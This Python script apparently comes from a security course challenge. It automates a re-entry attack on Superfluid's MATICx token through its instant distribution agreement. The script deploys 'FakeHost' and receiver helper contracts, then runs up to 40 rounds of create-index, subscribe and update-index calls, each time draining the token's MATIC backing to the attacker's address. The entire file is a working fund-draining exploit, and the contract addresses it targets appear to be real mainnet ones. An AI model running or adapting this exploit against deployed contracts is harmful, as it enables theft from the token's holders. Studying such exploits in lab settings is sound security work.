#!/usr/bin/env python3
"""
CH6 Full Drain — FakeHost re-entry with manual cast commands.
Each round: fresh index ID, reentry=10.
Uses already-deployed FH and RCV helpers.
"""
import subprocess, json, os, time, sys

from dotenv import load_dotenv
load_dotenv("/Users/dldustn/Desktop/AssignmentC/.env")

RPC = os.environ["RPC_CH6_SUPERFLUID_V21"]
PK = os.environ["PRIVATE_KEY"]
ATK = os.environ["PUBLIC_ADDRESS"]

MATICX = "0x3aD736904E9e65189c3000c7DD2c8AC8bB7cD4e3"
HOST = "0x3E14dC1b13c488a8d5D310918780c983bD5982E7"
IDA = "0xB0aABBA4B2783A72C52956CDEF62d438ecA2d7a1"

# Will be deployed on first run
FH = None
RCV = None

REENTRY = 10
GAS_LIMIT = "15000000"
SEED_CAP = 500 * 10**18  # 500 MATIC max per round to avoid SafeCast

def run_cmd(cmd, timeout=120):
    r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
    return r

def get_balance(addr):
    r = run_cmd(["cast", "balance", addr, "--rpc-url", RPC], 30)
    return int(r.stdout.strip())

def get_erc20_balance(token, addr):
    r = run_cmd(["cast", "call", "--rpc-url", RPC, token, "balanceOf(address)(uint256)", addr], 30)
    try:
        return int(r.stdout.strip().split()[0])
    except:
        return 0

def cast_send(to, sig, args=None, value=None, gas_limit=None, timeout=300):
    cmd = ["cast", "send", "--private-key", PK, "--rpc-url", RPC]
    if gas_limit:
        cmd += ["--gas-limit", str(gas_limit)]
    if value:
        cmd += ["--value", str(value)]
    cmd += [to, sig]
    if args:
        cmd += [str(a) for a in args]
    r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
    if r.returncode != 0:
        print(f"  ERR: {r.stderr.strip()[:200]}", flush=True)
        return False
    return True

def calldata(sig, args):
    cmd = ["cast", "calldata", sig] + [str(a) for a in args]
    r = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
    return r.stdout.strip()

def drain_maticx_round(idx, seed):
    """One round: upgrade → create index → subscribe → updateIndex → FH.go() → drain"""

    # 1. Upgrade MATIC to MATICx
    if not cast_send(MATICX, "upgradeByETH()", value=seed):
        return False

    # 2. Create index
    cd = calldata("createIndex(address,uint32,bytes)", [MATICX, idx, "0x"])
    if not cast_send(HOST, "callAgreement(address,bytes,bytes)", [IDA, cd, "0x"]):
        return False

    # 3. Subscribe
    cd = calldata("updateSubscription(address,uint32,address,uint128,bytes)", [MATICX, idx, RCV, 1, "0x"])
    if not cast_send(HOST, "callAgreement(address,bytes,bytes)", [IDA, cd, "0x"]):
        return False

    # 4. Update index
    cd = calldata("updateIndex(address,uint32,uint128,bytes)", [MATICX, idx, seed, "0x"])
    if not cast_send(HOST, "callAgreement(address,bytes,bytes)", [IDA, cd, "0x"]):
        return False

    # 5. FH attack
    if not cast_send(FH, "set(address,uint32,address,uint256)", [ATK, idx, RCV, REENTRY]):
        return False
    if not cast_send(FH, "go()", gas_limit=GAS_LIMIT, timeout=600):
        return False

    # 6. Drain receiver
    if not cast_send(RCV, "drain(address,address)", [MATICX, ATK]):
        return False

    return True

def main():
    print("=== CH6 Full MATICx Drain ===", flush=True)

    # Deploy FH and RCV
    print("Deploying helpers...", flush=True)
    artifact = "/Users/dldustn/Desktop/AssignmentC/challenges/ch6_superfluid_v21/out/MegaDrain.sol/FH2.json"
    with open(artifact) as f:
        fh_bc = json.load(f)["bytecode"]["object"]
    args = subprocess.run(["cast", "abi-encode", "c(address,address)", IDA, MATICX],
        capture_output=True, text=True).stdout.strip()
    r = subprocess.run(["cast", "send", "--private-key", PK, "--rpc-url", RPC, "--create", fh_bc + args[2:], "--json"],
        capture_output=True, text=True, timeout=120)
    global FH, RCV
    FH = json.loads(r.stdout)["contractAddress"]
    print(f"FH: {FH}", flush=True)

    artifact = "/Users/dldustn/Desktop/AssignmentC/challenges/ch6_superfluid_v21/out/MegaDrain.sol/RN2.json"
    with open(artifact) as f:
        rn_bc = json.load(f)["bytecode"]["object"]
    r = subprocess.run(["cast", "send", "--private-key", PK, "--rpc-url", RPC, "--create", rn_bc, "--json"],
        capture_output=True, text=True, timeout=120)
    RCV = json.loads(r.stdout)["contractAddress"]
    print(f"RCV: {RCV}", flush=True)

    idx_base = 1000

    for round_num in range(40):
        backing = get_balance(MATICX)
        bal = get_balance(ATK)
        print(f"\nRound {round_num}: backing={backing}, bal={bal}", flush=True)

        if backing == 0:
            print("FULLY DRAINED!", flush=True)
            break

        # Leave 0.5 MATIC for gas
        avail = max(0, bal - 5 * 10**17)
        if avail <= 0:
            print("Not enough MATIC", flush=True)
            break

        reentry = REENTRY
        seed = backing // reentry
        if seed == 0:
            seed = 1
            reentry = backing
        if seed > avail:
            seed = avail

        # int256 safety cap
        max_seed = (2**255 - 1) // (reentry + 1)
        if seed > max_seed:
            seed = max_seed

        # SafeCast protection: cap seed
        if seed > SEED_CAP:
            seed = SEED_CAP

        if seed == 0:
            break

        idx = idx_base + round_num
        print(f"  seed={seed}, reentry={reentry}, idx={idx}", flush=True)

        if not drain_maticx_round(idx, seed):
            print(f"  FAILED! Recovering MATICx...", flush=True)
            # Try to recover any MATICx stuck in our account
            my_maticx = get_erc20_balance(MATICX, ATK)
            if my_maticx > 0:
                cast_send(MATICX, "downgradeToETH(uint256)", [my_maticx])
                print(f"  Recovered {my_maticx} MATICx", flush=True)
            continue

        new_backing = get_balance(MATICX)
        new_bal = get_balance(ATK)
        print(f"  OK! drained={backing-new_backing}, bal={new_bal}", flush=True)

    print(f"\n=== FINAL ===", flush=True)
    print(f"MATICx backing: {get_balance(MATICX)}", flush=True)
    print(f"Our balance: {get_balance(ATK)}", flush=True)

if __name__ == "__main__":
    main()
